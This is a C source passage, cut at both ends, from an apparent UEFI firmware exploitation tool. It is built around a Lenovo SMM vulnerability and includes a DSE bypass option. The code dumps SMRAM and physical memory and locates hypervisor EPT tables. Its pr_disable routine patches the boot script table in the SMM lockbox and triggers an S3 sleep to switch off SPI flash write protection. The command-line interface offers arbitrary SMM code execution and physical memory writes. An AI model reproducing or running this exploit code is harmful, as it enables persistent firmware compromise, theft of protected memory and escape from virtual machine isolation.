    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry = PML4_page;

    // enumerate PML4 entries
    for (unsigned long long i_1 = 0; i_1 < 512; i_1 += 1, PML4_entry += 1)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PDPT_entry = PDPT_page;

        if (!EPT_PRESENT(PML4_entry->Uint64))
        {
            continue;
        }
        
        // read PDPT memory page
        if (phys_mem_read(
            target, (void *)PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress), 
            PAGE_SIZE, (unsigned char *)PDPT_page, NULL) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            goto _end;
        }

        // enumerate PDPT entries
        for (unsigned long long i_2 = 0; i_2 < 512; i_2 += 1, PDPT_entry += 1)
        {
            char message[0x100];
            unsigned long long host_addr = 0, guest_addr = 0;

            if (!EPT_PRESENT(PDPT_entry->Uint64))
            {
                continue;
            }

            // check for page size flag
            if ((PDPT_entry->Uint64 & PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K *PD_entry = PD_page;

                // read PDE memory page
                if (phys_mem_read(
                    target, (void *)PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress),
                    PAGE_SIZE, (unsigned char *)PD_page, NULL) != 0)
                {
                    printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
                    goto _end;
                }

                // enumerate PDE entries
                for (unsigned long long i_3 = 0; i_3 < 512; i_3 += 1, PD_entry += 1)
                {
                    if (!EPT_PRESENT(PD_entry->Uint64))
                    {
                        continue;
                    }

                    // check for page size flag
                    if ((PD_entry->Uint64 & PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K *PT_entry = PT_page;

                        // read PTE memory page
                        if (phys_mem_read(
                            target, (void *)PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress),
                            PAGE_SIZE, (unsigned char *)PT_page, NULL) != 0)
                        {
                            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
                            goto _end;
                        }

                        // enumerate PTE entries
                        for (unsigned long long i_4 = 0; i_4 < 512; i_4 += 1, PT_entry += 1)
                        {
                            if (!EPT_PRESENT(PT_entry->Uint64))
                            {
                                continue;
                            }

                            // 4 Kb page
                            host_addr = PFN_TO_PAGE(PT_entry->Bits.PageTableBaseAddress);
                            guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3) | PTE_ADDR(i_4);                            
                            
                            sprintf(
                                message, " %s "IFMT64" -> "IFMT64" 4K %s%s%s\n",
                                host_addr == guest_addr ? "*" : "!", guest_addr, host_addr,
                                EPT_R(PT_entry->Uint64) ? "R" : "", EPT_W(PT_entry->Uint64) ? "W" : "", 
                                EPT_X(PT_entry->Uint64) ? "X" : ""                                
                            );

                            if (fd)
                            {
                                fwrite(message, 1, strlen(message), fd);                                
                            }
                            else
                            {
                                printf("%s", message);
                            }
                        }
                    }
                    else
                    {                        
                        // 2Mb page
                        host_addr = PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress);
                        guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2) | PDE_ADDR(i_3);
                            
                        sprintf(
                            message, " %s "IFMT64" -> "IFMT64" 2M %s%s%s\n",
                            host_addr == guest_addr ? "*" : "!", guest_addr, host_addr,
                            EPT_R(PD_entry->Uint64) ? "R" : "", EPT_W(PD_entry->Uint64) ? "W" : "", 
                            EPT_X(PD_entry->Uint64) ? "X" : ""
                        );

                        if (fd)
                        {
                            fwrite(message, 1, strlen(message), fd);                                
                        }
                        else
                        {
                            printf("%s", message);
                        }
                    }
                }
            }
            else
            {
                // 1Gb page
                host_addr = PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress);
                guest_addr = PML4_ADDR(i_1) | PDPT_ADDR(i_2);

                sprintf(
                    message, " %s "IFMT64" -> "IFMT64" 1G %s%s%s\n",
                    host_addr == guest_addr ? "*" : "!", guest_addr, host_addr,
                    EPT_R(PDPT_entry->Uint64) ? "R" : "", EPT_W(PDPT_entry->Uint64) ? "W" : "", 
                    EPT_X(PDPT_entry->Uint64) ? "X" : ""
                );

                if (fd)
                {
                    fwrite(message, 1, strlen(message), fd);
                }
                else
                {
                    printf("%s", message);
                }
            }
        }
    }

_end:

    if (fd)
    {
        fclose(fd);
    }

    if (PT_page)
    {
        free(PT_page);
    }

    if (PD_page)
    {
        free(PD_page);
    }

    if (PDPT_page)
    {
        free(PDPT_page);
    }

    if (PML4_page)
    {
        free(PML4_page);
    }

    return false;
}
//--------------------------------------------------------------------------------------
int phys_mem_dump(PUEFI_EXPL_TARGET target, const char *file_path)
{
    int ret = -1;
    unsigned long long TOUUD = 0, TOLUD = 0;
    unsigned char *buff = NULL;
    unsigned int buff_size = PAGE_SIZE_2MB;
    FILE *f = NULL;

    if (!uefi_expl_pci_read(MEM_TOUUD, U64, &TOUUD))
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
        goto _end;
    }

    if (!uefi_expl_pci_read(MEM_TOLUD, U32, &TOLUD))
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
        goto _end;
    }

    // clear lock bits
    TOLUD &= ~1;
    TOUUD &= ~1;

    unsigned long long TSEG = smram_addr(target);
    if (TSEG == 0)
    {
        printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
        goto _end;
    }

    printf(" TSEG = "IFMT64"\n", TSEG);

    if (!((TSEG & (buff_size - 1)) == 0 && TSEG < 0x100000000))
    {
        printf("ERROR: Invalid TSEG address\n");
    }    
    
    printf("TOLUD = "IFMT64"\n", TOLUD);

    if (!((TOLUD & (buff_size - 1)) == 0 && TOLUD > TSEG + SMRAM_SIZE && TOLUD < 0x100000000))
    {
        printf("ERROR: Invalid TOLUD value\n");
        goto _end;
    }

    printf("TOUUD = "IFMT64"\n", TOUUD);      

    if (!((TOUUD & (buff_size - 1)) == 0 && TOUUD > 0x100000000 && TOUUD < 0xfffff80000000000))
    {
        printf("ERROR: Invalid TOUUD value\n");
        goto _end;
    }    

    // create output file
    if ((f = fopen(file_path, "wb")) == NULL)
    {
        printf("ERROR: Unable to create output file \"%s\"\n", file_path);
        goto _end;
    }    

    // allocate I/O buffer
    if ((buff = (unsigned char *)malloc(buff_size)) == NULL)
    {
        goto _end;
    }

    // dump low usable dram
    for (unsigned long long addr = 0; addr < TSEG + SMRAM_SIZE; addr += buff_size)
    {
        printf("Reading 0x%llx:0x%llx...\n", addr, addr + buff_size - 1);

        // read snigle chunk of memory
        if (phys_mem_read(target, (void *)addr, buff_size, buff, NULL) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            goto _end;
        }

        // write readed data to file
        if (fwrite(buff, 1, buff_size, f) != buff_size)
        {
            printf("ERROR: fwrite() fails\n");
            goto _end;
        }

        fflush(f);
    }    

    memset(buff, 0, buff_size);

    // fill memory range from TOLUD to 0xffffffff with zeros
    for (unsigned long long addr = TSEG + SMRAM_SIZE; addr < 0x100000000; addr += buff_size)
    {
        // write readed data to file
        if (fwrite(buff, 1, buff_size, f) != buff_size)
        {
            printf("ERROR: fwrite() fails\n");
            goto _end;
        }
    }

    fflush(f);

    // dump high usable dram
    for (unsigned long long addr = 0x100000000; addr < TOUUD; addr += buff_size)
    {
        printf("Reading 0x%llx:0x%llx...\n", addr, addr + buff_size - 1);

        // read snigle chunk of memory
        if (phys_mem_read(target, (void *)addr, buff_size, buff, NULL) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            goto _end;
        }

        // write readed data to file
        if (fwrite(buff, 1, buff_size, f) != buff_size)
        {
            printf("ERROR: fwrite() fails\n");
            goto _end;
        }

        fflush(f);
    }

    ret = 0;

_end:

    if (buff)
    {
        free(buff);
    }

    if (f)
    {
        fclose(f);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
// offset of the EFI_SMM_SYSTEM_TABLE2::NumberOfTableEntries and SmmConfigurationTable
#define EFI_SMM_SYSTEM_TABLE2_NumberOfTableEntries  0xa8
#define EFI_SMM_SYSTEM_TABLE2_SmmConfigurationTable 0xb0

typedef struct 
{
    GUID VendorGuid;
    void *VendorTable;

} EFI_CONFIGURATION_TABLE;

unsigned long long configuration_table_addr(PUEFI_EXPL_TARGET target, GUID *guid)
{
    unsigned long long ret = 0, table_addr = 0, table_entries = 0;

    // get EFI_SMM_SYSTEM_TABLE2 address
    unsigned long long smst = smst_addr(target);
    if (smst == 0)
    {
        printf(__FUNCTION__"() ERROR: smst_addr() fails\n");
        return 0;
    }

    printf("EFI_SMM_SYSTEM_TABLE2 is at 0x%llx\n", smst);

    unsigned long long TSEG = smst & ~(unsigned long long)(SMRAM_SIZE - 1);

    // read NumberOfTableEntries value
    if (phys_mem_read(
        target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_NumberOfTableEntries), 
        sizeof(unsigned long long), (unsigned char *)&table_entries, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        return 0;
    }

    if (table_entries > 0x10)
    {
        printf(__FUNCTION__"() ERROR: Invalid NumberOfTableEntries value\n");
        return 0;
    }

    // read SmmConfigurationTable pointer
    if (phys_mem_read(
        target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_SmmConfigurationTable),
        sizeof(unsigned long long), (unsigned char *)&table_addr, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        return 0;
    }    

    if (!IS_SMRAM_PTR(table_addr))
    {
        printf(__FUNCTION__"() ERROR: Invalid SmmConfigurationTable value\n");
        return 0;
    }

    printf(
        "UEFI SMM configuration table with %d entries is at 0x%llx\n", 
        table_entries, table_addr
    );

    for (unsigned long long i = 0; i < table_entries; i += 1)
    {
        EFI_CONFIGURATION_TABLE table_entry;

        // read configuration table entry
        if (phys_mem_read(
            target, (void *)(table_addr + i * sizeof(EFI_CONFIGURATION_TABLE)),
            sizeof(EFI_CONFIGURATION_TABLE), (unsigned char *)&table_entry, NULL) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            return 0;
        }

        // match GUID
        if (!memcmp(&table_entry.VendorGuid, guid, sizeof(GUID)))
        {
            if (!IS_SMRAM_PTR(table_entry.VendorTable))
            {
                printf(__FUNCTION__"() ERROR: Invalid VendorTable value\n");
                return 0;
            }

            // return vendor specific table address
            return (unsigned long long)table_entry.VendorTable;
        }
    }

    return ret;
}
//--------------------------------------------------------------------------------------
// "LOCKB_64" magic constant
#define SMM_LOCK_BOX_SIGNATURE_64 0x34365F424B434F4C

typedef struct
{
    unsigned long long Signature;
    LIST_ENTRY *Head;

} SMM_LOCK_BOX_DATA;

typedef struct 
{
    unsigned int Size;
    unsigned long long Unknown;
    void *Address;    
    LIST_ENTRY Link;

} SMM_BOOT_SCRIPT;

int boot_script_table_addr(PUEFI_EXPL_TARGET target, unsigned long long *addr, unsigned int *size)
{
    // get SMRAM address
    unsigned long long TSEG = smram_addr(target);
    if (TSEG == 0)
    {
        printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
        return -1;
    }

    printf("SMRAM is at 0x%llx:0x%llx\n", TSEG, TSEG + SMRAM_SIZE - 1);

    // find EFI SMM configuration table that belongs to SMM lockbox
    unsigned long long lockbox_addr = configuration_table_addr(target, gEfiSmmLockBoxCommunicationGuid);
    if (lockbox_addr == 0)
    {
        printf(__FUNCTION__"() ERROR: Unable to find SMM lockbox configuration entry\n");
        return -1;
    }

    printf("SMM lockbox configuration table is at 0x%llx\n", lockbox_addr);

    SMM_LOCK_BOX_DATA lockbox;    

    // read SMM lockbox structure
    if (phys_mem_read(
        target, (void *)lockbox_addr,
        sizeof(SMM_LOCK_BOX_DATA), (unsigned char *)&lockbox, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        return -1;
    }    

    // check for valid magic constant at the beginning of the lockbox structure
    if (lockbox.Signature != SMM_LOCK_BOX_SIGNATURE_64)
    {
        printf(__FUNCTION__"() ERROR: SMM lockbox signature missmatch\n");
        return -1;
    }

    if (!IS_SMRAM_PTR(lockbox.Head))
    {
        printf(__FUNCTION__"() ERROR: Invalid Link value\n");
        return -1;
    }

    LIST_ENTRY list_entry;

    // read SMM lockbox LIST_ENTRY
    if (phys_mem_read(
        target, (void *)lockbox.Head,
        sizeof(LIST_ENTRY), (unsigned char *)&list_entry, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        return -1;
    }

    if (!IS_SMRAM_PTR(list_entry.Blink))
    {
        printf(__FUNCTION__"() ERROR: Invalid Blink value\n");
        return -1;
    }

    SMM_BOOT_SCRIPT bootscript;

    // read boot script table information
    if (phys_mem_read(
        target, 
        (void *)((unsigned long long)list_entry.Blink - FIELD_OFFSET(SMM_BOOT_SCRIPT, Link)),
        sizeof(SMM_BOOT_SCRIPT), (unsigned char *)&bootscript, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        return -1;
    }

    if (!IS_SMRAM_PTR(bootscript.Address))
    {
        printf(__FUNCTION__"() ERROR: Invalid boot script table address\n");
        return -1;
    }

    if (bootscript.Size <= 2 || bootscript.Size > PAGE_SIZE * 10)
    {
        printf(__FUNCTION__"() ERROR: Invalid boot script table size\n");
        return -1;
    }

    printf(
        "UEFI boot script table is at 0x%llx (length: 0x%llx bytes)\n", 
        bootscript.Address, bootscript.Size
    );
    
    unsigned short bootscript_magic = 0;

    // read boot script table signature
    if (phys_mem_read(
        target, bootscript.Address,
        sizeof(unsigned short), (unsigned char *)&bootscript_magic, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        return -1;
    }

    if (bootscript_magic != 0xAA)
    {
        printf(__FUNCTION__"() ERROR: Boot script table signature missmatch\n");
        return -1;
    }

    *addr = (unsigned long long)bootscript.Address;
    *size = bootscript.Size;

    return 0;
}
//--------------------------------------------------------------------------------------
void *boot_script_table_read(PUEFI_EXPL_TARGET target, unsigned long long *addr, unsigned int *size)
{
    unsigned long long bootscript_addr = 0;
    unsigned int bootscript_size = 0;

    // find UEFI boot script table address (points inside SMRAM) and size
    if (boot_script_table_addr(target, &bootscript_addr, &bootscript_size) != 0)
    {
        printf(__FUNCTION__"() ERROR: Unable to find UEFI boot script table\n");
        return NULL;
    }

    // allocate bufer for boot script table entries
    void *bootscript = malloc(bootscript_size);
    if (bootscript == NULL)
    {
        return NULL;
    }

    // read boot script table entries
    if (phys_mem_read(
        target, (void *)bootscript_addr, bootscript_size, (unsigned char *)bootscript, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        free(bootscript);
        return NULL;
    }

    *addr = bootscript_addr;
    *size = bootscript_size;

    return bootscript;
}
//--------------------------------------------------------------------------------------
int pr_get(
    PUEFI_EXPL_TARGET target,
    unsigned int *pr0_val, unsigned int *pr1_val, 
    unsigned int *pr2_val, unsigned int *pr3_val, 
    unsigned int *pr4_val)
{
    unsigned long long RCBA = 0;

    // get Root Complex Base Address register value
    if (!uefi_expl_pci_read(LPC_RCBA, U32, &RCBA))
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
        return -1;
    }

    // get Root Complex Register Block address
    unsigned long long rcrb_addr = RCBA & 0xffffc000;

    if (rcrb_addr == 0 || rcrb_addr > 0xfffff000)
    {
        printf(__FUNCTION__"() ERROR: Invalid RCBA value\n");
        return -1;
    }

    struct
    {
        unsigned long long addr;
        unsigned int *val;

    } pr_regs[] = { { rcrb_addr + PR0, pr0_val },
                    { rcrb_addr + PR1, pr1_val },
                    { rcrb_addr + PR2, pr2_val },
                    { rcrb_addr + PR3, pr3_val },
                    { rcrb_addr + PR4, pr4_val } };

    for (int i = 0; i < 5; i += 1)
    {
        *pr_regs[i].val = 0;

        // read single PRx register
        if (phys_mem_read_val(target, (void *)pr_regs[i].addr, U32, pr_regs[i].val) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read_val() fails\n");
            return -1;
        }
    }    

    return 0;
}
//--------------------------------------------------------------------------------------
int pr_disable(int target_, PUEFI_EXPL_TARGET target)
{
    int ret = -1;
    unsigned long long bootscript_addr = 0, RCBA = 0;
    unsigned int bootscript_size = 0, ptr = 2;
    unsigned int pr0_val = 0, pr1_val = 0, pr2_val = 0, pr3_val = 0, pr4_val = 0;

    // get current values of PRx registers
    if (pr_get(target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
    {
        printf(__FUNCTION__"() ERROR: pr_get() fails\n");
        return -1;
    }

    printf(" * PR0 = 0x%.8x\n", pr0_val);
    printf(" * PR1 = 0x%.8x\n", pr1_val);
    printf(" * PR2 = 0x%.8x\n", pr2_val);
    printf(" * PR3 = 0x%.8x\n", pr3_val);
    printf(" * PR4 = 0x%.8x\n", pr4_val);

    // check if any protected ranges are set
    if (pr0_val == 0 && pr1_val == 0 && pr2_val == 0 && pr3_val == 0 && pr4_val == 0)
    {
        printf("SPI Protected Ranges flash write protection is not enabled\n");
        return 0;
    }

    // get Root Complex Base Address register value
    if (!uefi_expl_pci_read(LPC_RCBA, U32, &RCBA))
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
        return -1;
    }

    // get Root Complex Register Block address
    unsigned long long rcrb_addr = RCBA & 0xffffc000;

    if (rcrb_addr == 0 || rcrb_addr > 0xfffff000)
    {
        printf(__FUNCTION__"() ERROR: Invalid RCBA value\n");
        return -1;
    }

    printf("Root Complex Register Block is at 0x%llx\n", rcrb_addr);

    // read boot script table
    unsigned char *bootscript = (unsigned char *)boot_script_table_read(
        target, &bootscript_addr, &bootscript_size
    );
    if (bootscript == NULL)
    {
        printf(__FUNCTION__"() ERROR: Unable to read boot script table\n");
        return -1;
    }

    struct
    {
        const char *name;
        unsigned long long addr;
        bool found;

    } pr_regs[] = { { "PR0", rcrb_addr + PR0, false },
                    { "PR1", rcrb_addr + PR1, false },
                    { "PR2", rcrb_addr + PR2, false },
                    { "PR3", rcrb_addr + PR3, false },
                    { "PR4", rcrb_addr + PR4, false } };

    int registers_found = 0, entries_patched = 0;

    // enumerate table entries
    while (ptr < bootscript_size - 2)
    {
        unsigned char *entry = bootscript + ptr;

        // get entry size and opcode
        unsigned char size = *(entry + 0);
        unsigned char code = *(entry + 1);

        if (size > bootscript_size - ptr)
        {
            printf(__FUNCTION__"() ERROR: Invalid boot script table entry size\n");
            goto _end;
        }

        // check if boot script table entry performs memory write operation
        if (code == BOOT_SCRIPT_MEM_WRITE_OPCODE)
        {
            // get write address and value arguments
            unsigned long long addr = *(unsigned long long *)(entry + 0x09);
            unsigned int val = *(unsigned int *)(entry + 0x11);

            for (int i = 0; i < 5; i += 1)
            {
                // determinate if address belongs to PRx register
                if (addr == pr_regs[i].addr)
                {
                    printf(
                        " * table entry at 0x%llx writes 0x%x to register %s\n",
                        bootscript_addr + ptr, val, pr_regs[i].name
                    );

                    val = 0;

                    // patch PRx write value to zero
                    if (phys_mem_write(
                        target, (void *)(bootscript_addr + ptr + 0x11),
                        sizeof(unsigned int), (unsigned char *)&val, NULL) == 0)
                    {
                        entries_patched += 1;
                    }
                    else
                    {
                        printf(__FUNCTION__"() ERROR: phys_mem_write() fails\n");
                    }

                    if (!pr_regs[i].found)
                    {
                        registers_found += 1;
                    }

                    pr_regs[i].found = true;
                    break;
                }
            }
        }

        // go to the next boot script table entry
        ptr += size;
    }

    if (registers_found > 0)
    {
        printf("%d UEFI boot script table entries was patched\n", entries_patched);        

        // go to the S3 sleep
        if (s3_sleep_with_timeout(10) == 0)
        {
            // get current values of PRx registers
            if (pr_get(target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
            {
                printf(__FUNCTION__"() ERROR: pr_get() fails\n");
                goto _end;
            }

            // check if any protected ranges are set
            if (pr0_val == 0 && pr1_val == 0 && pr2_val == 0 && pr3_val == 0 && pr4_val == 0)
            {
                printf("SPI Protected Ranges flash write protection was successfully disabled\n");

                ret = 0;
            }
        }              
        else
        {
            printf(__FUNCTION__"() ERROR: Unbale to put machine into the S3 sleep\n");
        }
    }
    else
    {
        printf(__FUNCTION__"() ERROR: Unbale to find boot script table entries that sets PRx\n");
    }

_end:

    if (bootscript)
    {
        free(bootscript);
    }

    return ret;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    int ret = -1, target_num = -1;
    unsigned long long length, pml4_addr = 0;        
    const char *data_file = NULL;
    void *mem_read = NULL, *mem_write = NULL;
    bool use_dse_bypass = false, use_test = false;
    bool use_smram_dump = false, use_mem_dump = false;
    bool use_ept_find = false, use_pr_disable = false;
    bool use_bs_dump = false;
    int use_s3_resume = -1;
    
    SMM_HANDLER_CONTEXT context;
    memset(&context, 0, sizeof(context));
    context.op = SMM_OP_NONE;

    UEFI_EXPL_TARGET target;
    memset(&target, 0, sizeof(target));
    target.smi_num = -1;    

    // parse command line options
    for (int i = 1; i < argc; i++)
    {
        if (!strcmp(argv[i], "--exec") && i < argc - 1)
        {
            context.op = SMM_OP_EXECUTE;

            // execute SMM code at given physical addres
            context.execute.addr = (SMM_PROC)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-read") && i < argc - 1)
        {
            // read memory (one page by default)
            mem_read = (void *)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-write") && i < argc - 1)
        {
            context.op = SMM_OP_MEM_WRITE;

            // write memory (--file option is mandatory)
            mem_write = (void *)strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--phys-mem-dump"))
        {
            // dump physical memory
            use_mem_dump = true;
        }
        else if (!strcmp(argv[i], "--ept-find"))
        {
            // find EPT addresses for all of the running VMX guests
            use_ept_find = true;
        }
        else if (!strcmp(argv[i], "--ept-dump"))
        {
            // dump specific EPT
            pml4_addr = strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid PML4 address specified\n");
                return -1;
            }
            
            i += 1;
        }
        else if (!strcmp(argv[i], "--pr-disable"))
        {
            // disable PRx flash write protection
            use_pr_disable = true;
        }
        else if (!strcmp(argv[i], "--length") && i < argc - 1)
        {
            // memory read/write length
            length = strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid length specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target") && i < argc - 1)
        {
            // update target model number
            target_num = strtoul(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid target number specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target-addr") && i < argc - 1)
        {
            /* 
                Address of EFI_BOOT_SERVICES.LocateProtocol field that necessary for 
                SystemSmmAhciAspiLegacyRt vulnerability exploitation.
            */
            target.addr = strtoull(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid EFI_BOOT_SERVICES.LocateProtocol address specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target-smi") && i < argc - 1)
        {
            // SMI handler number for SystemSmmAhciAspiLegacyRt vulnerability exploitation
            target.smi_num = strtoul(argv[i + 1], NULL, 16);

            if (errno != 0)
            {
                printf("ERROR: Invalid SMI handler number specified\n");
                return -1;
            }

            i += 1;
        }
        else if (!strcmp(argv[i], "--target-list"))
        {
            // print available targets and exit
            expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info();
            return 0;
        }
        else if (!strcmp(argv[i], "--file") && i < argc - 1)
        {
            // use file to read or write SMRAM data
            data_file = argv[i + 1];

            i += 1;
        }
        else if (!strcmp(argv[i], "--dse-bypass"))
        {
            // bypass Windows x64 DSE
            use_dse_bypass = true;
        }        
        else if (!strcmp(argv[i], "--test"))
        {
            // run libfwexpl tests
            use_test = true;
        }
        else if (!strcmp(argv[i], "--smram-dump"))
        {
            // dump SMRAM contents
            use_smram_dump = true;
        }
        else if (!strcmp(argv[i], "--bs-dump"))
        {
            // dump UEFI Boot Script Table stored in SMM LockBox
            use_bs_dump = true;
        }
        else if (!strcmp(argv[i], "--s3-resume") && i < argc - 1)
        {
            // trigger S3 suspend-resume cycle
            use_s3_resume = (int)strtoul(argv[i + 1], NULL, 10);

            if (errno != 0)
            {
                printf("ERROR: Invalid S3 sleep time specified\n");
                return -1;
            }

            i += 1;
        }
        else
        {
            printf("ERROR: Unknown option %s\n", argv[i]);
            return -1;
        }
    }    

#ifdef USE_RWDRV

    if (use_dse_bypass)
    {
        printf(
            "ERROR: --dse-bypass option is not valid for this version of the tool "
            "because it imlements libfwexpl API using digitally signed RWEveryting "
            " driver. If you want to use DSE bypass kernel driver exploit that loads "
            "our own unsigned driver -- please disable USE_RWDRV in config.h and "
            "recompie the program.\n"
        );

        return -1;
    }

#endif // USE_RWDRV

    if (use_smram_dump && data_file == NULL)
    {
        printf("ERROR: --file is required for --smram-dump\n");
        return -1;
    }

    if (use_mem_dump && data_file == NULL)
    {
        printf("ERROR: --file is required for --phys-mem-dump\n");
        return -1;
    }

    if (mem_read && length == 0)
    {
        printf("ERROR: --length is required for --phys-mem-read\n");
        return -1;
    }

    if (mem_write && data_file == NULL)
    {
        printf("ERROR: --file is required for --phys-mem-write\n");
        return -1;
    }

    if (use_bs_dump && data_file == NULL)
    {
        printf("ERROR: --file is required for --bs-dump\n");
        return -1;
    }

    // initialize target model information
    if (!expl_lenovo_SystemSmmAhciAspiLegacyRt_init(&target, target_num))
    {
        return -1;
    }

    // initialize HAL
    if (uefi_expl_init(NULL, use_dse_bypass))
    {    
        unsigned long long val = 0;               

        if (use_test)
        {
            // run tests and exit
            ret = test();
        }
        else if (uefi_expl_pci_read(PCI_ADDR(0, 0, 0, 0), U32, &val))
        {
            unsigned short vid = (unsigned short)((val >> 0) & 0xffff),
                           did = (unsigned short)((val >> 16) & 0xffff);

            printf("Host bridge VID = 0x%.4x, DID = 0x%.4x\n", vid, did);           
            
            // check for Intel VID
            if (vid == 0x8086)
            {
                if (mem_read)
                {
                    // read memory contents
                    ret = phys_mem_read(&target, mem_read, length, NULL, data_file);
                }
                else if (mem_write)
                {
                    // write memory contents
                    ret = phys_mem_write(&target, mem_write, length, NULL, data_file);
                }
                else if (use_mem_dump)
                {
                    // dump all of the memory contents to file
                    ret = phys_mem_dump(&target, data_file);
                }
                else if (use_ept_find)
                {                    
                    int items_found = 0;
                    unsigned long long *ept = NULL, vmm_cr3 = 0;
                    
                    // find running VMX virtual machines and get their EPTP values
                    if (ept_find(&target, &items_found, &ept, &vmm_cr3))
                    {
                        if (vmm_cr3 != 0)
                        {
                            printf("VMM CR3 is 0x%llx\n", vmm_cr3);
                        }
                        else
                        {
                            printf("VMM was not found\n");
                        }

                        if (items_found > 0)
                        {
                            printf("%d running VMX virtual machines found, addresses of EPT PML4:\n", items_found);

                            for (int i = 0; i < items_found; i += 1)
                            {
                                printf(
                                    "  #%.2d: 0x%llx, levels = %d, cacheable = %s\n",
                                    i, EPT_BASE(ept[i]), EPT_PAGE_WALK_LEN(ept[i]), EPT_CACHEABLE(ept[i]) ? "y" : "n"
                                );
                            }                            
                        }
                        else
                        {
                            printf("No VMX virtual machines found\n");
                        }

                        ret = 0;
                        free(ept);
                    }
                }
                else if (pml4_addr != 0)
                {
                    // dump EPT tables
                    ret = ept_dump(&target, pml4_addr, data_file);
                }
                else if (use_pr_disable)
                {
                    // disable SPI protected ranges
                    ret = pr_disable(target_num, &target);
                }
                else if (use_smram_dump)
                {
                    unsigned long long addr = 0;

                    // get current SMRAM address
                    if (addr = smram_addr(&target))
                    {
                        printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);

                        // read SMRAM contents
                        ret = phys_mem_read(&target, (void *)addr, SMRAM_SIZE, NULL, data_file);
                    }
                    else
                    {
                        printf("ERROR: Unable to determinate SMRAM address\n");
                    }
                }
                else if (use_bs_dump)
                {
                    unsigned long long bootscript_addr = 0;
                    unsigned int bootscript_size = 0;

                    // read boot script table
                    void *bootscript = boot_script_table_read(&target, &bootscript_addr, &bootscript_size);
                    if (bootscript)
                    {
                        // create output file
                        FILE *f = fopen(data_file, "wb");
                        if (f)
                        {
                            // write readed data to file
                            if (fwrite(bootscript, 1, bootscript_size, f) == bootscript_size)
                            {
                                printf("%d bytes written into the %s\n", bootscript_size, data_file);

                                ret = 0;
                            }
                            else
                            {
                                printf("ERROR: fwrite() fails\n");
                            }

                            fclose(f);
                        }
                        else
                        {
                            printf("ERROR: Unable to create output file \"%s\"\n", data_file);
                        }

                        free(bootscript);
                    }
                    else
                    {
                        printf(__FUNCTION__"() ERROR: Unable to read boot script table\n");
                    }
                }
                else if (use_s3_resume != -1)
                {
                    printf("Going to S3 sleep for %d seconds...\n", use_s3_resume);

                    // go to the S3 sleep for specific amount of seconds
                    if ((ret = s3_sleep_with_timeout(use_s3_resume)) == 0)
                    {
                        printf("SUCCESS\n");
                    }
                    else
                    {
                        printf("ERROR: s3_sleep_with_timeout() fails\n");
                    }
                }
                else
                {                    
                    // run exploitation
                    ret = exploit(&target, &context, 0, false);
                }
            }
            else
            {
                printf("ERROR: Unsupported platform\n");
            }
        }               
        else
        {
            printf("ERROR: uefi_expl_pci_read() fails\n");
        }
_end:
        // uninitialize HAL
